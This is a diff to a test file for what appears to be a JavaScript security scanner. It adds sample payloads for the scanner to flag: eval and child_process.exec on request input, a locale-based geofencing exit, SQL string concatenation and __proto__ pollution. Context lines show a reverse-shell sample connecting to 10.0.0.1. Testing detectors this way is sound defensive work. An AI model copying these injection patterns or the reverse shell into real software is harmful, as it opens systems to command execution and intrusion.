@@ -42,7 +42,21 @@ client.connect(1337, "10.0.0.1", function(){
 });`;
 const polyShellTest = scanFile('reverse_shell.js', polyShellPayload);
 
+// 3.5 Taint Tracking & Geofencing
+const taintPayload = `
+const req = { body: { cmd: 'malware' } };
+if (process.env.LANG === 'ru_RU.UTF-8') { return; }
+eval(req.body.cmd);
+child_process.exec("git clone " + req.query);
+`;
+const taintTest = scanFile('data_flow.js', taintPayload);
 
+const injectionPayload = `
+const userInput = "hacked";
+db.query("SELECT * FROM users WHERE name = " + userInput);
+myObj['__proto__'] = { admin: true };
+`;
+const injectionTest = scanFile('injection.js', injectionPayload);
 // 4. Secret Detection Tests
 const secretPayloads = [
   { name: 'aws_leak.tf', content: 'aws_access_key_id = "AKIA_NOT_REAL_KEY_123"' },
@@ -77,6 +91,8 @@ printResults(entropyTest);
 printResults(lifecycleTest);
 printResults(packedObfuscationTest);
 printResults(polyShellTest);
+printResults(taintTest);
+printResults(injectionTest);
 
 console.log("\n=== SECRET DETECTION TESTS ===\n");
 secretResults.forEach(r => printResults(r));
